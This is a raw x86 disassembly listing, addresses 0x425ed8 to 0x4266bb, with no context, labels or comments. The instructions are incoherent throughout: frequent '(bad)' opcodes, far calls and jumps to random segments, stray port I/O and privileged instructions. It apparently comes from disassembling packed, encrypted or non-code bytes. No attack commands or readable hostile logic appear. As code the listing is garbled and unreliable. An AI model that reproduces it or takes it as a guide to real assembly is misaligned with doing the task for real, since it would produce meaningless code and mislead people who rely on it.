  425ed8:	mov    ebx,0x8040192e
  425edd:	cwde   
  425ede:	inc    esi
  425edf:	gs inc ecx
  425ee1:	dec    esi
  425ee2:	lds    eax,FWORD PTR [edi]
  425ee4:	jge    0x425eda
  425ee6:	push   ds
  425ee7:	jecxz  0x425eef
  425ee9:	mov    edi,0x758e227a
  425eee:	jb     0x425eaf
  425ef0:	mov    DWORD PTR [eax+0x4c8e08b],edx
  425ef6:	pop    esi
  425ef7:	push   0xffffffaa
  425ef9:	jle    0x425f24
  425efb:	push   cs
  425efc:	loope  0x425f5a
  425efe:	add    BYTE PTR [esi+0x3c],dh
  425f01:	adc    DWORD PTR [ebx+0xb],0x8d123117
  425f08:	mov    al,ds:0xe711344e
  425f0d:	(bad)  
  425f0e:	fimul  DWORD PTR [esi+0x1b]
  425f11:	aas    
  425f12:	outs   dx,DWORD PTR ds:[esi]
  425f13:	xlat   BYTE PTR ds:[ebx]
  425f14:	jo     0x425f5a
  425f16:	push   ebp
  425f17:	add    esp,edx
  425f19:	xor    eax,0x118dae2a
  425f1e:	aaa    
  425f1f:	sub    BYTE PTR [edi-0x10],0x0
  425f23:	aam    0xb9
  425f25:	dec    eax
  425f26:	retf   0x23c8
  425f29:	lds    ebx,FWORD PTR [edi]
  425f2b:	and    eax,0xec386bd2
  425f30:	push   ecx
  425f31:	sbb    BYTE PTR [ebx-0x4a1a22d7],bl
  425f37:	add    al,0x7b
  425f39:	or     al,0x47
  425f3b:	out    dx,eax
  425f3c:	cdq    
  425f3d:	push   ss
  425f3e:	jg     0x425ef3
  425f40:	call   0xf435:0x86b8c86a
  425f47:	nop
  425f48:	fistp  WORD PTR [edx+0x4126be69]
  425f4e:	leave  
  425f4f:	popa   
  425f50:	adc    bh,bl
  425f52:	sub    DWORD PTR [ecx-0xb],0x17
  425f56:	mov    BYTE PTR [ecx+0x18c1a45d],bh
  425f5c:	inc    edi
  425f5d:	sbb    BYTE PTR [esi+0x3066370f],bh
  425f63:	pop    es
  425f64:	ror    DWORD PTR [eax+0x68],cl
  425f67:	push   es
  425f68:	aaa    
  425f69:	cdq    
  425f6a:	jmp    0xd038:0x6357b0c0
  425f71:	dec    ecx
  425f72:	nop
  425f73:	mov    bl,BYTE PTR [ecx+0x4e922bda]
  425f79:	je     0x425fc1
  425f7b:	sar    DWORD PTR [eax+0x69],cl
  425f7e:	and    bl,BYTE PTR [edi]
  425f80:	mov    cl,0x83
  425f82:	dec    eax
  425f83:	in     al,dx
  425f84:	mov    BYTE PTR [eax+0xcec1980],ah
  425f8a:	pop    ds
  425f8b:	mov    edi,0x6e1468f7
  425f90:	xchg   DWORD PTR [eax-0x5e06f863],esi
  425f96:	xor    ebp,DWORD PTR [esi]
  425f98:	ds inc esp
  425f9a:	xor    al,0xf0
  425f9c:	(bad)  
  425f9d:	jge    0x425fe8
  425f9f:	in     al,dx
  425fa0:	daa    
  425fa1:	mov    ah,0x3f
  425fa3:	adc    eax,0xc94eaea4
  425fa8:	dec    eax
  425faa:	push   edx
  425fab:	add    ebp,DWORD PTR [edx-0x60d5b14f]
  425fb1:	inc    ebp
  425fb2:	jb     0x425fd8
  425fb4:	and    ebp,0x62
  425fb7:	adc    DWORD PTR [ecx+0x12],eax
  425fba:	jmp    DWORD PTR [edx+ecx*4+0x8]
  425fbe:	mov    cl,0x52
  425fc0:	inc    esi
  425fc1:	dec    edi
  425fc2:	mov    ecx,0xd5737990
  425fc7:	mov    dh,0x3d
  425fc9:	inc    edi
  425fca:	rcl    DWORD PTR [eax-0x11],0xf6
  425fce:	push   eax
  425fcf:	ror    DWORD PTR es:[eax-0x3d49daf0],cl
  425fd6:	inc    ecx
  425fd7:	popf   
  425fd8:	adc    BYTE PTR [ebp+edi*1-0x2f],dh
  425fdc:	loop   0x425ffd
  425fde:	mov    esp,0x1e7b167e
  425fe3:	cmp    BYTE PTR [edi+0x4206158f],cl
  425fe9:	inc    ecx
  425fea:	adc    al,BYTE PTR [ecx-0x7f201b6c]
  425ff0:	(bad)  
  425ff1:	push   cs
  425ff2:	lds    ecx,FWORD PTR [ebx+0x24]
  425ff5:	or     al,0xba
  425ff7:	imul   ebp,DWORD PTR [ebx+eax*4-0x2b336273],0x359ac234
  426002:	add    al,0x4
  426004:	add    DWORD PTR ds:0x8804e7e1,eax
  42600a:	add    DWORD PTR [ebx+ebx*1+0x1],edx
  42600e:	stc    
  42600f:	jecxz  0x425fda
  426011:	dec    esp
  426012:	adc    BYTE PTR [ebx-0x7c01ef37],ah
  426018:	pop    es
  426019:	hlt    
  42601a:	adc    eax,0xf5ae369d
  42601f:	or     dl,dh
  426021:	stos   DWORD PTR es:[edi],eax
  426022:	loope  0x426054
  426024:	inc    BYTE PTR [edx-0x3a0fdd8d]
  42602a:	js     0x42605a
  42602c:	sbb    DWORD PTR [esi+esi*1-0x75],0xaabbcf20
  426034:	test   al,0x4d
  426036:	push   eax
  426037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426038:	dec    edx
  426039:	and    cl,BYTE PTR gs:[eax+0x21]
  42603d:	push   edi
  42603e:	jno    0x42605d
  426040:	and    al,0x6b
  426042:	sub    eax,0x4e38b854
  426047:	sub    BYTE PTR [ecx+ecx*2-0x5e725045],cl
  42604e:	ja     0x426043
  426050:	sbb    ch,BYTE PTR [edi+0x3560956b]
  426056:	pop    es
  426057:	fist   WORD PTR [ebp+0x109077c]
  42605d:	push   ss
  42605e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42605f:	daa    
  426060:	fld    QWORD PTR [ebp-0x1996173b]
  426066:	mov    ecx,0x862b6bc8
  42606b:	inc    ecx
  42606c:	push   ebp
  42606d:	pusha  
  42606e:	rol    DWORD PTR [esi],cl
  426070:	pusha  
  426071:	jbe    0x4260ed
  426073:	cdq    
  426074:	hlt    
  426075:	ss push ebp
  426077:	rcr    DWORD PTR [edx+0x70c7cec],0xd6
  42607e:	call   0x64ef:0x85224af8
  426085:	daa    
  426086:	jo     0x4260f5
  426088:	sub    cl,BYTE PTR [edx+0x3a0aa553]
  42608e:	cmp    eax,0x9afdf30b
  426093:	into   
  426094:	push   esp
  426095:	or     dh,BYTE PTR [ecx-0x70]
  426098:	dec    ecx
  426099:	cmp    eax,DWORD PTR [edx+ebx*1-0x2afa269f]
  4260a0:	or     eax,0x2ec0ea81
  4260a5:	cs inc edx
  4260a7:	nop
  4260a8:	lahf   
  4260a9:	int    0x46
  4260ab:	ret    
  4260ac:	cmp    BYTE PTR [ebp+0x6f],dl
  4260af:	xchg   ecx,eax
  4260b0:	add    DWORD PTR [eax-0x53ceb26e],ebp
  4260b6:	push   ebp
  4260b7:	push   ebp
  4260b8:	dec    ebx
  4260b9:	mov    al,0xe
  4260bb:	lods   al,BYTE PTR ds:[esi]
  4260bc:	inc    eax
  4260bd:	push   es
  4260be:	in     eax,0xe
  4260c0:	addr16 push ebx
  4260c2:	sub    esp,DWORD PTR [edx-0x355f4bb7]
  4260c8:	inc    edx
  4260c9:	dec    ebp
  4260ca:	daa    
  4260cb:	ret    
  4260cc:	mov    al,0x5a
  4260ce:	or     eax,0x4d6e51fc
  4260d3:	aaa    
  4260d4:	loopne 0x42612a
  4260d6:	xor    esi,DWORD PTR [edx-0x2cc38ec6]
  4260dc:	call   0x63ab3482
  4260e1:	mov    DWORD PTR [edi],esp
  4260e3:	inc    edx
  4260e4:	cmc    
  4260e5:	in     eax,dx
  4260e6:	xor    esp,DWORD PTR [ebx+0x4e13249e]
  4260ec:	repnz loope 0x42613c
  4260ef:	or     edi,DWORD PTR [esi-0x40e67cf0]
  4260f5:	das    
  4260f6:	outs   dx,BYTE PTR ds:[esi]
  4260f7:	mov    al,0xa8
  4260f9:	shl    DWORD PTR ds:0xd31d04cd,0xa2
  426100:	cs or  al,0x60
  426103:	cmp    BYTE PTR [ebx],dh
  426105:	shr    BYTE PTR [ebp+edx*1+0x2201b120],1
  42610c:	push   ebp
  42610d:	dec    esp
  42610e:	bound  esi,QWORD PTR [edi]
  426110:	stos   DWORD PTR es:[edi],eax
  426111:	repnz cwde 
  426113:	jp     0x426190
  426115:	enter  0x4f78,0x8
  426119:	pop    eax
  42611a:	mov    BYTE PTR [ebp-0x28],bh
  42611d:	inc    ebp
  42611e:	addr16 push esi
  426120:	daa    
  426121:	sbb    cl,dh
  426123:	inc    ebx
  426124:	xor    BYTE PTR [ebx],dl
  426126:	pushf  
  426127:	(bad)  
  426128:	fisub  WORD PTR [eax+0x1a]
  42612b:	repz int3 
  42612d:	and    BYTE PTR [ecx+eax*2],ah
  426130:	adc    edx,DWORD PTR [edx-0x3eb3d733]
  426136:	lods   al,BYTE PTR ds:[esi]
  426137:	popa   
  426138:	and    BYTE PTR [ecx-0x33637df7],bh
  42613e:	xchg   edx,eax
  42613f:	call   0x625d4465
  426144:	cmp    BYTE PTR [esi-0x2e],dl
  426147:	aas    
  426148:	in     eax,dx
  426149:	adc    DWORD PTR [edi-0x3d4cccc6],edi
  42614f:	add    dh,ch
  426151:	dec    ecx
  426152:	popa   
  426153:	jecxz  0x4260f1
  426155:	adc    DWORD PTR [eax],0x19
  426158:	imul   BYTE PTR [edi-0x385dad94]
  42615e:	sbb    al,0xec
  426160:	or     DWORD PTR [esi+0x74],esi
  426163:	ja     0x426142
  426165:	es inc edi
  426167:	cmp    dl,bh
  426169:	outs   dx,BYTE PTR ds:[esi]
  42616a:	bound  edx,QWORD PTR [ebx+0x25653b83]
  426170:	push   ecx
  426171:	mov    dh,0x23
  426173:	mov    edx,0x972e4820
  426178:	rol    DWORD PTR [ecx],1
  42617a:	xor    ecx,edi
  42617c:	inc    eax
  42617d:	inc    ebx
  42617e:	jnp    0x426190
  426180:	dec    edx
  426181:	dec    ebp
  426182:	adc    al,BYTE PTR [eax]
  426184:	mov    eax,ds:0x91449371
  426189:	mov    es,WORD PTR [esp+esi*2]
  42618c:	xor    ecx,esi
  42618e:	jbe    0x42616d
  426190:	rcr    DWORD PTR [eax+0x1aa80bea],0x72
  426197:	test   al,0x76
  426199:	jno    0x4261af
  42619b:	xor    al,0x5f
  42619d:	cli    
  42619e:	mov    ecx,0xa7fc3c49
  4261a3:	retf   
  4261a4:	pop    edx
  4261a5:	sbb    cl,BYTE PTR [edx-0x6a]
  4261a8:	in     al,0x82
  4261aa:	aaa    
  4261ab:	push   esi
  4261ac:	imul   esp,DWORD PTR [edx-0x2c19cd27],0x8c3ec6f2
  4261b6:	xchg   BYTE PTR [edi+edi*2+0x62],ah
  4261ba:	inc    ebx
  4261bb:	out    dx,eax
  4261bc:	add    edi,DWORD PTR [esi]
  4261be:	mov    WORD PTR [esi+0x7e0b6d30],ss
  4261c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261c5:	mov    al,ds:0x8dd9ce34
  4261ca:	cmp    edx,0xa4371ea3
  4261d0:	add    edi,DWORD PTR [eax]
  4261d2:	push   esi
  4261d3:	jmp    0x426178
  4261d5:	dec    edx
  4261d6:	shr    DWORD PTR [eax+0x488522ec],0x18
  4261dd:	out    dx,eax
  4261de:	jecxz  0x42621c
  4261e0:	push   ss
  4261e1:	cmp    BYTE PTR [edi+0x38579928],bh
  4261e7:	adc    al,ch
  4261e9:	pop    eax
  4261ea:	lea    edi,ss:[edx+edx*8-0x3a]
  4261ef:	in     eax,0x42
  4261f1:	or     edi,DWORD PTR [ecx-0x38b9ba7c]
  4261f7:	cmp    DWORD PTR [esi-0x45],esi
  4261fa:	push   0x832bea12
  4261ff:	cmp    dl,BYTE PTR [ebx+eax*8-0x24]
  426203:	jp     0x42620c
  426205:	outs   dx,DWORD PTR ds:[esi]
  426206:	mov    esi,0xa7231c72
  42620b:	push   esi
  42620c:	icebp  
  42620d:	jp     0x4261b9
  42620f:	(bad)  [edx-0x384d1e29]
  426215:	mov    ecx,0xba940094
  42621a:	pop    es
  42621b:	repnz ins BYTE PTR es:[edi],dx
  42621d:	(bad)  
  42621e:	cmp    al,0x48
  426220:	sbb    DWORD PTR [eax],0xffffffd3
  426223:	push   ds
  426224:	mov    al,0x6d
  426226:	(bad)  
  426227:	adc    DWORD PTR [esi],eax
  426229:	add    BYTE PTR [edi+0x61],ch
  42622c:	and    al,0xc6
  42622e:	pop    ecx
  42622f:	stos   BYTE PTR es:[edi],al
  426230:	mov    eax,ds:0x38a01a88
  426235:	cli    
  426236:	retf   0x64c
  426239:	outs   dx,DWORD PTR ds:[esi]
  42623a:	fisubr WORD PTR [eax]
  42623c:	mov    ds:0xa3e16b3c,eax
  426241:	dec    ebx
  426242:	popa   
  426243:	sbb    al,0x1e
  426245:	iret   
  426246:	popa   
  426247:	add    DWORD PTR [ebp+ebp*4+0x6a06a43a],0x269d5c35
  426252:	xor    ebx,0x5d6faaaa
  426258:	mov    BYTE PTR [ebx],bl
  42625a:	xchg   esi,eax
  42625b:	mov    ss,WORD PTR [eax-0x69]
  42625e:	xlat   BYTE PTR ds:[ebx]
  42625f:	int    0x14
  426261:	mov    eax,ds:0x15c7360d
  426266:	and    al,0x50
  426268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426269:	aad    0x22
  42626b:	inc    ecx
  42626c:	ins    BYTE PTR es:[edi],dx
  42626d:	inc    esp
  42626e:	push   ebx
  42626f:	pop    eax
  426270:	lods   eax,DWORD PTR ds:[esi]
  426271:	test   BYTE PTR [eax+0x6e],dh
  426274:	ins    DWORD PTR es:[edi],dx
  426275:	sbb    eax,0x206e58a9
  42627a:	cmp    DWORD PTR [edx-0xcf74b93],0xcdaa52c6
  426284:	jb     0x4262a1
  426286:	aas    
  426287:	call   0x84b:0x339ae368
  42628e:	test   ebx,edi
  426290:	enter  0x2170,0xad
  426294:	inc    esi
  426295:	add    al,0x1b
  426297:	xor    eax,0xce2e1517
  42629c:	or     edi,DWORD PTR [ebp+0x60900201]
  4262a2:	mov    al,ds:0xdf75f84d
  4262a7:	and    al,0xb8
  4262a9:	gs cmp dl,bh
  4262ac:	dec    esi
  4262ad:	hlt    
  4262ae:	pusha  
  4262af:	and    DWORD PTR [ebx+edx*2],edx
  4262b2:	(bad)  
  4262b3:	aaa    
  4262b4:	or     esp,ebx
  4262b6:	je     0x42629f
  4262b8:	add    DWORD PTR [ebx],edi
  4262ba:	jecxz  0x4262bc
  4262bc:	in     al,0x9f
  4262be:	imul   eax,DWORD PTR [esp+esi*1],0x3d8b04ab
  4262c5:	inc    eax
  4262c6:	aam    0xa
  4262c8:	and    DWORD PTR [esi-0x7f],ebx
  4262cb:	test   BYTE PTR ds:0x910536f8,0xac
  4262d2:	inc    edx
  4262d3:	shl    BYTE PTR [esi],1
  4262d5:	add    DWORD PTR [edx],ecx
  4262d7:	ror    DWORD PTR [edx],cl
  4262d9:	sbb    edi,edx
  4262db:	or     ah,BYTE PTR [eax-0x59]
  4262de:	mov    ebx,0xf72bbe4e
  4262e3:	ins    DWORD PTR es:[edi],dx
  4262e4:	sbb    cl,ah
  4262e6:	test   al,0xb
  4262e8:	fcomip st,st(3)
  4262ea:	pusha  
  4262eb:	push   es
  4262ec:	sub    al,0xc9
  4262ee:	fdivr  QWORD PTR [ebx]
  4262f0:	(bad)  
  4262f1:	sbb    BYTE PTR [esp+eax*2+0x152ae9b8],ah
  4262f8:	inc    ebx
  4262f9:	xchg   edi,eax
  4262fa:	pushf  
  4262fb:	mov    esp,ecx
  4262fd:	sub    BYTE PTR [esi+0x19],al
  426300:	scas   eax,DWORD PTR es:[edi]
  426301:	inc    esp
  426302:	(bad)  
  426303:	dec    ecx
  426304:	dec    eax
  426305:	lods   al,BYTE PTR ds:[esi]
  426306:	clc    
  426307:	ret    0x1d25
  42630a:	clc    
  42630b:	scas   al,BYTE PTR es:[edi]
  42630c:	stos   DWORD PTR es:[edi],eax
  42630d:	ret    
  42630e:	mov    eax,0xeaa0b054
  426313:	sti    
  426314:	(bad)  
  426315:	jb     0x426386
  426317:	xchg   esp,eax
  426318:	inc    esp
  426319:	dec    ebp
  42631a:	adc    eax,0x85c15431
  42631f:	popw   ds
  426321:	shr    DWORD PTR [edx-0x8f6f428],cl
  426327:	ret    
  426328:	dec    esi
  426329:	add    dh,cl
  42632b:	inc    esp
  42632c:	push   es
  42632d:	iret   
  42632e:	lods   eax,DWORD PTR ds:[esi]
  42632f:	outs   dx,BYTE PTR ds:[esi]
  426330:	bound  ecx,QWORD PTR [esp+eax*8+0x7e91d21f]
  426337:	sub    eax,0x3215ead4
  42633c:	mov    ah,BYTE PTR [eax]
  42633e:	bound  eax,QWORD PTR es:[ecx+0x5d]
  426342:	inc    DWORD PTR [ecx]
  426344:	push   esp
  426345:	xor    eax,0x26d5418b
  42634a:	faddp  st(2),st
  42634c:	sub    bh,cl
  42634e:	pop    ebp
  42634f:	call   0x23c1:0xa25af212
  426356:	or     BYTE PTR fs:[edx+0x48e7c8c9],ch
  42635d:	jns    0x4263ae
  42635f:	pop    esi
  426360:	sbb    al,0xc0
  426362:	jg     0x426377
  426364:	sbb    DWORD PTR [esi-0x1f],edx
  426367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426368:	xchg   DWORD PTR [edi],esi
  42636a:	mov    WORD PTR [ebp-0x76d32acf],?
  426370:	js     0x4263a6
  426372:	mov    ebp,0xc4167242
  426377:	outs   dx,BYTE PTR ds:[esi]
  426378:	bound  esp,QWORD PTR [esi-0x2ff4746c]
  42637e:	mul    dh
  426380:	lods   eax,DWORD PTR ds:[esi]
  426381:	add    al,0xa7
  426383:	push   esp
  426384:	or     eax,0xff88f79a
  426389:	or     dh,BYTE PTR [ebp-0x73]
  42638c:	pushf  
  42638d:	lea    esp,[edi+0x288e0e4b]
  426393:	mov    ds:0x7dfe8939,eax
  426398:	jbe    0x426332
  42639a:	int3   
  42639b:	retf   0xdaa2
  42639e:	fcmovnb st,st(3)
  4263a0:	sbb    al,0xc5
  4263a2:	jge    0x4263d8
  4263a4:	xchg   ecx,eax
  4263a5:	inc    esp
  4263a6:	aaa    
  4263a7:	sbb    BYTE PTR [ebp+0x42b17420],ah
  4263ad:	cmp    eax,0xd19f2a7f
  4263b2:	add    DWORD PTR [ebx+0x4d],edx
  4263b5:	and    ch,dl
  4263b7:	xchg   esi,eax
  4263b8:	stos   BYTE PTR es:[edi],al
  4263b9:	lods   eax,DWORD PTR ds:[esi]
  4263ba:	inc    ecx
  4263bb:	xchg   ebp,eax
  4263bc:	rcl    ch,0xd
  4263bf:	jbe    0x4263bb
  4263c1:	clc    
  4263c2:	mov    ebp,0xe8ae3aad
  4263c7:	mov    ebx,0xfa0ee8b8
  4263cc:	addr16 pop esi
  4263ce:	jmp    0x169f:0x835ac60e
  4263d5:	das    
  4263d6:	inc    ecx
  4263d7:	dec    edi
  4263d8:	data16 sbb BYTE PTR [eax+0x69330130],dh
  4263df:	ins    BYTE PTR es:[edi],dx
  4263e0:	pop    ebx
  4263e1:	xchg   ebp,eax
  4263e2:	mov    DWORD PTR ds:0x798a0455,ecx
  4263e8:	xchg   DWORD PTR [ebx+0xc],ecx
  4263eb:	sbb    edx,DWORD PTR [edx]
  4263ed:	fisubr WORD PTR [ecx-0x510f0bca]
  4263f3:	or     BYTE PTR [esi+0x57],ah
  4263f6:	fisttp DWORD PTR [eax]
  4263f8:	lock (bad) 
  4263fa:	sti    
  4263fb:	jp     0x426456
  4263fd:	mov    ah,0x56
  4263ff:	sbb    ecx,DWORD PTR [eax-0x72]
  426402:	gs jo  0x4263a1
  426405:	cli    
  426406:	pop    eax
  426407:	test   al,0xdd
  426409:	(bad)  
  42640a:	out    dx,al
  42640b:	dec    esp
  42640c:	add    al,0xc7
  42640e:	or     BYTE PTR [ecx+0x7e],dl
  426411:	pusha  
  426412:	cmp    al,0x81
  426414:	inc    ebx
  426415:	mov    ds:0xef5f824,eax
  42641a:	cmc    
  42641b:	adc    eax,0x25e44f4b
  426420:	inc    edx
  426421:	mov    ebp,0x4c699383
  426426:	les    edi,FWORD PTR [ebx-0x58]
  426429:	hlt    
  42642a:	ins    DWORD PTR es:[edi],dx
  42642b:	pop    esp
  42642c:	ins    BYTE PTR es:[edi],dx
  42642d:	pop    ebx
  42642e:	fs ins BYTE PTR es:[edi],dx
  426430:	and    DWORD PTR [ebx*8+0xa379608],esi
  426437:	cwde   
  426438:	mov    eax,ds:0x7c5aa0fa
  42643d:	das    
  42643e:	jo     0x426451
  426440:	adc    ch,BYTE PTR [edx]
  426442:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426443:	mov    al,ds:0xcb17e0ef
  426448:	jmp    0x426422
  42644a:	iret   
  42644b:	arpl   WORD PTR [ebp-0x26],cx
  42644e:	(bad)  
  42644f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426450:	fldcw  WORD PTR [ebx]
  426452:	adc    BYTE PTR [eax-0x7762b350],bh
  426458:	shl    DWORD PTR [ecx+0x74e4bc2c],cl
  42645e:	mov    dh,0x2b
  426460:	mov    al,ds:0x1243db88
  426465:	add    ah,0xef
  426468:	sub    DWORD PTR [edi+esi*1+0x1c],eax
  42646c:	loope  0x426444
  42646e:	aaa    
  42646f:	ds aaa 
  426471:	add    edi,DWORD PTR [esi+esi*4]
  426474:	and    DWORD PTR [ebx],0xffffff8c
  426477:	lea    edx,[edi]
  426479:	add    dl,BYTE PTR [esi]
  42647b:	jecxz  0x42641c
  42647d:	jmp    0x8c859c09
  426482:	in     eax,0xf7
  426484:	adc    dl,BYTE PTR [edi+0x20]
  426487:	xchg   ebx,eax
  426489:	or     al,0xb
  42648b:	ss jmp 0x42649c
  42648e:	call   0x12a9:0xbfe05512
  426495:	sar    BYTE PTR [eax],0xa8
  426498:	es jecxz 0x4264cc
  42649b:	sub    edi,DWORD PTR [ebx-0x66fbdf8]
  4264a1:	call   0x2cdd:0x5d4d88d5
  4264a8:	ins    BYTE PTR es:[edi],dx
  4264a9:	and    al,BYTE PTR [esi-0x3d]
  4264ac:	push   ss
  4264ad:	jl     0x426475
  4264af:	and    eax,0x5a26044
  4264b4:	or     al,0x8d
  4264b6:	out    0xfb,eax
  4264b8:	lea    ecx,[edi-0x14]
  4264bb:	pop    ds
  4264bc:	jb     0x42651c
  4264be:	(bad)  
  4264bf:	fsubrp st(1),st
  4264c1:	aaa    
  4264c2:	cmp    ecx,DWORD PTR [eax-0x23]
  4264c5:	jae    0x426507
  4264c7:	jne    0x4264ce
  4264c9:	mov    ch,al
  4264cb:	scas   al,BYTE PTR es:[edi]
  4264cc:	mov    ecx,0xe38fe99f
  4264d1:	imul   edi,DWORD PTR [edi+eiz*1],0xffffffe1
  4264d5:	pop    esi
  4264d6:	or     eax,0x5f06887b
  4264db:	(bad)  
  4264dc:	ins    DWORD PTR es:[edi],dx
  4264dd:	loope  0x42653e
  4264df:	sti    
  4264e0:	dec    ecx
  4264e1:	adc    al,0x42
  4264e3:	dec    ecx
  4264e4:	hlt    
  4264e5:	sbb    cl,BYTE PTR ds:0x2c6b52dd
  4264eb:	adc    eax,ebp
  4264ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4264ee:	push   edx
  4264ef:	add    esp,DWORD PTR [edi+0x4b]
  4264f2:	gs fs ret 0xf216
  4264f7:	rol    DWORD PTR [eax],1
  4264f9:	add    eax,0xbbf0c0c6
  4264fe:	mov    edx,0x1d3046d9
  426503:	inc    edi
  426504:	xchg   edx,eax
  426505:	daa    
  426506:	jbe    0x426492
  426508:	enter  0xa9b2,0xfc
  42650c:	jecxz  0x426552
  42650e:	cmp    DWORD PTR [edi+0x7abdede4],0x28
  426515:	mov    eax,ds:0x85618620
  42651a:	add    BYTE PTR [esi+0xd],dl
  42651d:	add    dh,BYTE PTR [eax]
  42651f:	jnp    0x42655f
  426521:	or     al,0x17
  426523:	je     0x426576
  426525:	push   0xa91f0ca8
  42652a:	fstp   DWORD PTR [esi]
  42652c:	jecxz  0x42653e
  42652e:	xor    eax,0x817ccc1
  426533:	sbb    ebp,DWORD PTR [ebx+0x29]
  426536:	pop    ecx
  426537:	sub    DWORD PTR [edx-0x3],0x20263d26
  42653e:	mov    DWORD PTR [eax-0x76],edx
  426541:	add    DWORD PTR [ecx+edi*4],edx
  426544:	sub    BYTE PTR [ebx],ch
  426546:	in     al,0xcc
  426548:	aaa    
  426549:	push   ebx
  42654a:	cmc    
  42654b:	stc    
  42654c:	xor    dl,BYTE PTR [ecx-0x15]
  42654f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426550:	cmp    dh,ch
  426552:	or     al,0x99
  426554:	inc    ecx
  426555:	fst    QWORD PTR [ebp-0x73]
  426558:	pop    edi
  426559:	mov    ds:0xd409fc94,eax
  42655e:	test   al,0xe
  426560:	jne    0x4265dd
  426562:	jge    0x426541
  426564:	ins    DWORD PTR es:[edi],dx
  426565:	js     0x426593
  426567:	ret    
  426568:	mov    ch,0xe0
  42656a:	(bad)  [esi-0x1ea795ca]
  426570:	jnp    0x42655d
  426572:	dec    ebp
  426573:	inc    edi
  426574:	xlat   BYTE PTR ds:[ebx]
  426575:	retf   0x71cc
  426578:	add    al,0x7f
  42657a:	fsubr  QWORD PTR [ecx+eiz*1-0x2c]
  42657e:	sbb    cl,BYTE PTR [eax+0x7500151d]
  426584:	rcl    DWORD PTR [ebx-0x1190c2c0],0x6a
  42658b:	mov    esi,0x51d77cef
  426590:	jl     0x42658d
  426592:	lahf   
  426593:	lahf   
  426594:	lds    ebx,FWORD PTR [edi-0x6d]
  426597:	ror    DWORD PTR [edx],0xa
  42659a:	test   al,0xc3
  42659c:	scas   eax,DWORD PTR es:[edi]
  42659d:	test   DWORD PTR [eax],ebp
  42659f:	or     DWORD PTR [eax+esi*8-0x3a],esp
  4265a3:	scas   eax,DWORD PTR es:[edi]
  4265a4:	jae    0x4265a7
  4265a6:	inc    esp
  4265a7:	push   0x49
  4265a9:	in     al,0x53
  4265ab:	sbb    BYTE PTR [ebx],bh
  4265ad:	sub    esp,DWORD PTR [ecx+0x7bd7c748]
  4265b3:	es push es
  4265b5:	lds    ebx,FWORD PTR ds:0xb6a842d5
  4265bb:	dec    ecx
  4265bc:	xchg   edi,eax
  4265bd:	mov    ds:0x9f317c21,eax
  4265c2:	shl    BYTE PTR [ebx-0xa],0x8
  4265c6:	sbb    eax,DWORD PTR es:0x386d664c
  4265cd:	pushf  
  4265ce:	call   0x9cb69ef5
  4265d3:	test   BYTE PTR [edi-0x17],bl
  4265d6:	je     0x426648
  4265d8:	std    
  4265d9:	pop    eax
  4265da:	or     al,BYTE PTR [ecx+0x4e]
  4265dd:	in     al,0xf8
  4265df:	inc    esi
  4265e0:	add    eax,0x419caf47
  4265e5:	mov    al,0xc5
  4265e7:	mov    DWORD PTR [ebp+0x29],esi
  4265ea:	adc    eax,0x5b9ff7a8
  4265ef:	scas   eax,DWORD PTR es:[edi]
  4265f0:	pusha  
  4265f1:	sub    al,0x99
  4265f3:	xchg   ebx,ebx
  4265f5:	sub    al,0x23
  4265f7:	adc    cl,BYTE PTR [esi+0x5b1e21eb]
  4265fd:	faddp  st(4),st
  4265ff:	jmp    0x426668
  426601:	(bad)  
  426602:	jo     0x4265d3
  426604:	add    WORD PTR [ebx+0x29e3196e],si
  42660b:	pop    ss
  42660c:	btc    DWORD PTR [ebx-0x8],esi
  426610:	push   0x34
  426612:	(bad)  
  426613:	pop    ds
  426614:	pop    ebx
  426615:	ds dec ebx
  426617:	sub    cl,bl
  426619:	inc    ebp
  42661a:	sbb    DWORD PTR [eax+esi*8+0x45],0x4a
  42661f:	test   BYTE PTR [ebx],cl
  426621:	lock dec ebx
  426623:	and    BYTE PTR [ecx+0xabc4087],ch
  426629:	jbe    0x42666d
  42662b:	xor    al,0x33
  42662d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42662e:	fiadd  WORD PTR [ebp+ebp*8-0x2c93369a]
  426635:	mov    eax,0x99e56666
  42663a:	fnstenv [ecx+0x52]
  42663d:	adc    DWORD PTR [edi-0x24],eax
  426640:	aas    
  426641:	out    dx,al
  426642:	shl    ch,1
  426644:	int3   
  426645:	xor    al,0x52
  426647:	and    edx,ebx
  426649:	loope  0x42668d
  42664b:	mov    ds:0x5c604482,al
  426650:	inc    ebx
  426651:	adc    BYTE PTR [edx+0x4cd478d9],al
  426657:	push   edx
  426658:	mov    dl,0x8d
  42665a:	xor    DWORD PTR [ecx-0x79],ecx
  42665d:	sbb    edi,DWORD PTR [ecx-0x79c42762]
  426663:	cmc    
  426664:	jp     0x42663f
  426666:	and    DWORD PTR fs:[esi-0x4f],esp
  42666a:	cli    
  42666b:	stos   DWORD PTR es:[edi],eax
  42666c:	out    dx,eax
  42666d:	mov    dh,cl
  42666f:	sub    ecx,DWORD PTR [ebp+ecx*8+0x74]
  426673:	pop    ss
  426674:	mov    dh,BYTE PTR [ebp+0x5c]
  426677:	adc    BYTE PTR [edx+0x12285d19],al
  42667d:	push   ebx
  42667e:	jmp    0x8ee4:0xb8fa482c
  426685:	call   0xad31974a
  42668a:	sub    BYTE PTR [eax],ch
  42668c:	lods   al,BYTE PTR ds:[esi]
  42668d:	adc    DWORD PTR [eax],eax
  42668f:	mov    eax,ds:0x82246164
  426694:	cmp    BYTE PTR ds:0x20d5b3d9,ah
  42669a:	jne    0x42667b
  42669c:	cmp    al,0x5a
  42669e:	out    dx,al
  42669f:	es jle 0x426633
  4266a2:	fistp  DWORD PTR ds:0xb7f1a44b
  4266a8:	int    0x28
  4266aa:	or     bl,ch
  4266ac:	and    BYTE PTR ds:0xeab28b85,al
  4266b2:	daa    
  4266b3:	adc    DWORD PTR [ebx],ecx
  4266b5:	loope  0x4266a0
  4266b7:	jne    0x4266db
  4266b9:	add    DWORD PTR [edx],esi
  4266bb:	add    edx,ebp
